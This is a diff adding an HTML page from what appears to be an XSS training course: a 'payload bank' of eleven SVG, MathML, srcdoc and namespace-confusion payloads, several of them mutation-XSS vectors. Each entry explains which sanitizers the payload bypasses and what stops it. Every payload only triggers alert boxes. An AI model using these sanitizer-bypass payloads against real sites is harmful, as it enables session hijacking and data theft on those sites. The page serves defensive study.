@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Bank 04 — SVG, MathML &amp; Namespace Confusion</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:36px 32px;max-width:900px}
+  h1{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
+  .sub{font-size:12px;color:var(--muted);margin-bottom:32px}
+  .entry{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}
+  .entry-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .entry-num{font-size:11px;font-weight:700;color:var(--muted);background:#060d1a;padding:3px 10px;border-radius:10px}
+  .tags{display:flex;flex-wrap:wrap;gap:5px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px}
+  .t-mechanism{background:#1e3a5f;color:var(--accent)}
+  .t-bypass{background:#2a0000;color:var(--danger)}
+  .t-origin{background:#1a1500;color:var(--warn)}
+  .t-namespace{background:#0d002a;color:var(--purple)}
+  .payload-block{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);margin:10px 0;position:relative;white-space:pre-wrap;word-break:break-all}
+  .copy-btn{position:absolute;top:8px;right:8px;font-size:10px;padding:3px 10px;background:#1e3a5f;color:var(--accent);border:1px solid var(--accent);border-radius:3px;cursor:pointer}
+  .meta{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12px;margin-top:10px}
+  .meta-key{color:var(--muted);font-weight:700;white-space:nowrap}
+  .meta-val{color:var(--text)}
+  .meta-val code{font-family:'Courier New',monospace;font-size:11px;background:#060d1a;color:var(--accent);padding:1px 5px;border-radius:3px}
+  .stopped{color:var(--ok)}
+  .bypasses{color:var(--danger)}
+  .nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  .nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .section-label{font-size:13px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>04 — SVG, MathML &amp; Namespace Confusion</h1>
+<div class="sub">11 payloads · Mechanism: Namespace / Tag Parsing · Module reference: M07 · Lab: <code>/reflect?q=PAYLOAD</code></div>
+
+<div class="section-label">A. SVG — Inline Script Execution</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">TAG PARSING</span><span class="tag t-namespace">SVG</span></div>
+    <span class="entry-num">01</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — SVG namespace includes its own &lt;script&gt; element</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">1 — Tag parsing: SVG &lt;script&gt; executes JavaScript same as HTML &lt;script&gt;</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that check for script tags only in the HTML namespace</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; sanitizers that check all namespaces; blocking SVG entirely</span>
+    <span class="meta-key">Origin</span><span class="meta-val">SVG is a full XML namespace with its own script element. When embedded inline in HTML5, it runs in the same origin. "Just an image" is a dangerous mental model.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-namespace">SVG</span></div>
+    <span class="entry-num">02</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/animate&gt;&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — SVG animate element has onbegin event that fires when animation starts</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute in SVG namespace; fires automatically on parse</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters blocking HTML event handlers but not SVG animation event handlers</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; SVG-aware sanitizers stripping onbegin; blocking animate element</span>
+    <span class="meta-key">Origin</span><span class="meta-val">SVG SMIL animation elements (animate, set, animateTransform) have their own event model including onbegin, onend, onrepeat. These are distinct from HTML event attributes but equally powerful.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">TAG PARSING</span><span class="tag t-namespace">SVG</span><span class="tag t-bypass">FILE UPLOAD</span></div>
+    <span class="entry-num">03</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"&gt;
+  &lt;circle cx="50" cy="50" r="40" fill="red"/&gt;
+&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">SVG file served as image/svg+xml — or embedded inline after upload</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute: onload on SVG root fires when document loads</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Upload filters that check file extension/MIME but serve the file same-origin; image-only file checks</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Serving SVG from a separate domain; X-Content-Type-Options: nosniff; CSP on the serving domain</span>
+    <span class="meta-key">Origin</span><span class="meta-val">When an SVG is served same-origin as image/svg+xml and loaded in a &lt;img&gt; tag, the script doesn't run. But when it's served as a file download link or directly navigated to, it executes. The classic SVG upload XSS.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-namespace">SVG</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">04</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;svg&gt;&lt;desc&gt;&lt;/desc&gt;&lt;set attributeName=onmouseover to=alert(1)&gt;&lt;/set&gt;&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — SVG set element changes attributeName from nothing to an event handler</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — SVG SMIL animation sets an event attribute on the parent element</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that check static attributes at parse time but don't account for SMIL-based dynamic attribute setting</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Blocking SVG animation elements (set, animate, animateTransform); CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">SMIL &lt;set&gt; changes an attribute value dynamically. Setting attributeName=onmouseover and to=alert(1) writes an event handler onto the element after parse — bypassing static attribute checks.</span>
+  </div>
+</div>
+
+<div class="section-label">B. MathML Namespace Escapes</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-namespace">MATHML</span><span class="tag t-bypass">NAMESPACE ESCAPE</span></div>
+    <span class="entry-num">05</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;img src=x onerror=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — closing MathML correctly allows HTML to follow</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 + namespace: escape from MathML context back to HTML, then event handler fires</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that see the MathML block as a safe contained namespace and don't parse what follows</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOM-based sanitizers that parse the full document; output encoding; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">MathML is an HTML5 namespace like SVG. Once properly closed, the parser returns to HTML context. The img tag that follows is valid HTML. Used in mXSS research to demonstrate namespace boundary issues.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-namespace">MATHML</span><span class="tag t-bypass">NAMESPACE ESCAPE</span></div>
+    <span class="entry-num">06</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;img src onerror=alert(1)&gt;&lt;/table&gt;&lt;/mtext&gt;&lt;/math&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — complex MathML/HTML namespace interplay; a mXSS vector</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Context escape + reparse: mglyph inside mtext creates an annotation-xml integration point; table inside creates further parsing complexity; the result after innerHTML round-trip differs from original</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">String-based sanitizers; sanitizers that parse once but don't account for mXSS</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify (blocks this class); CSP; blocking MathML</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Mutation XSS vector discovered in 2019. The combination of MathML annotation-xml integration points, foster parenting from table, and style element raw-text mode creates a parser state machine that produces different output on re-parse.</span>
+  </div>
+</div>
+
+<div class="section-label">C. iframe srcdoc — Entity Decoding Layer</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-namespace">SRCDOC</span></div>
+    <span class="entry-num">07</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;iframe srcdoc="&amp;lt;script&amp;gt;alert(parent.document.domain)&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — srcdoc content is HTML-entity encoded, decoded by browser before parsing</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">1 — Tag parsing in sub-document; srcdoc decodes entities → produces &lt;script&gt; tag</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that see <code>&amp;lt;script&amp;gt;</code> as safe text content; filters checking for literal &lt;script&gt;</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Sanitizers treating srcdoc as HTML (decoding entities before checking); CSP; blocking iframe srcdoc</span>
+    <span class="meta-key">Origin</span><span class="meta-val">srcdoc attribute content is parsed as HTML after entity decoding. A sanitizer that checks the attribute value sees <code>&amp;lt;script&amp;gt;</code> (looks like escaped text). The browser decodes and sees an actual script tag.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-namespace">SVG</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">08</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;svg&gt;&lt;style&gt;&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — style element inside SVG is raw text (CDATA) context; img that follows may be parsed as HTML depending on parser state</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">5 — Context escape: in SVG context, style is raw text; after serialization and re-parse in HTML context, style content ends at &lt;/style&gt; and img is free HTML</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that model SVG/style context incorrectly in mXSS scenarios</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify; CSP; avoiding innerHTML round-trips</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Classic mXSS vector (M13). In SVG context, &lt;style&gt; is raw text — so &lt;img…&gt; inside it is just text. Serialized: <code>&lt;svg&gt;&lt;style&gt;&lt;/style&gt;&lt;img…&gt;&lt;/svg&gt;</code>. Re-parsed in HTML: style ends at &lt;/style&gt;, img becomes HTML.</span>
+  </div>
+</div>
+
+<div class="section-label">D. Namespace Switching in Attribute Contexts</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-namespace">SVG</span><span class="tag t-mechanism">EVENT ATTR</span></div>
+    <span class="entry-num">09</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;svg&gt;&lt;a xlink:href="javascript:alert(1)"&gt;&lt;text y=20&gt;click&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">SVG namespace — xlink:href allows javascript: URI on SVG anchor elements</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme via SVG xlink:href attribute</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers checking HTML href but not SVG xlink:href for javascript:</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Sanitizers that normalise xlink:href to href and apply same checks; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">xlink:href is the SVG/XML linking attribute. It accepts javascript: just like HTML href. Many sanitizers check href but miss xlink:href because it's a different attribute name with a namespace prefix.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-namespace">SVG</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">10</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;svg&gt;&lt;foreignObject width="100%" height="100%"&gt;
+  &lt;div xmlns="http://www.w3.org/1999/xhtml"&gt;
+    &lt;img src=x onerror=alert(1)&gt;
+  &lt;/div&gt;
+&lt;/foreignObject&gt;&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — SVG foreignObject embeds HTML namespace inside SVG</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute in HTML namespace embedded inside SVG foreignObject</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">SVG-specific sanitizers that don't parse foreignObject content as HTML</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Blocking foreignObject in SVG sanitization rules; CSP; DOMPurify</span>
+    <span class="meta-key">Origin</span><span class="meta-val">foreignObject is explicitly designed to embed HTML inside SVG. The xmlns declaration switches the parser back to HTML namespace. The img tag inside is full HTML with event handlers. This is why SVG file upload filters must check foreignObject.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-namespace">MATHML</span><span class="tag t-bypass">ANNOTATION</span></div>
+    <span class="entry-num">11</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;math&gt;&lt;annotation-xml encoding="text/html"&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/annotation-xml&gt;&lt;/math&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — MathML annotation-xml with HTML encoding creates an HTML integration point</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 + namespace: annotation-xml with encoding="text/html" is an HTML integration point — content is parsed as HTML</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that treat annotation-xml as XML text content; filters missing the HTML integration point semantics</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify; blocking annotation-xml; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">The HTML5 spec defines annotation-xml with encoding="text/html" (or "application/xhtml+xml") as an "HTML integration point" — content switches to HTML parsing mode. The img tag inside is parsed as HTML with full event model.</span>
+  </div>
+</div>
+
+<div class="nav">
+  <a href="03_uri_schemes.html">← 03: URI Schemes</a>
+  <a href="../payload_bank.html">Index</a>
+  <a href="05_dom_sinks.html">05: DOM Sinks →</a>
+</div>
+
+<script>
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    btn.textContent = 'copied!';
+    setTimeout(() => btn.textContent = 'copy', 1500);
+  });
+});
+</script>
+
+</body>
+</html>
